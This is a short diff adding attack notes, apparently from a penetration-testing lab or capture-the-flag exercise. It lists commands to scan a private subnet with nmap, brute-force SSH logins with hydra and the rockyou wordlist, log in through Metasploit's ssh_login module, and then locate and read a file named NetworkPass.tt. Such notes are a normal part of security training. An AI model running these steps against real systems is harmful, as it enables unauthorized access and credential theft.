@@ -1,0 +1,18 @@
+Exploit a remote login and command-line execution application on a Linux target in the 192.168.0.0/24 
+------------------------------------------------------------------------------------------------------
+nmap -sV 192.168.0.0/24
+
+nmap -sV -p22 192.168.0.0/24
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 ssh
+
+msfconsole
+use exploit/linux/ssh/ssh_login
+set RHOST <target IP>
+set USERNAME <username>
+set PASSWORD <password>
+exploit
+
+find / -name NetworkPass.tt
+
+cat NetworkPass.tt
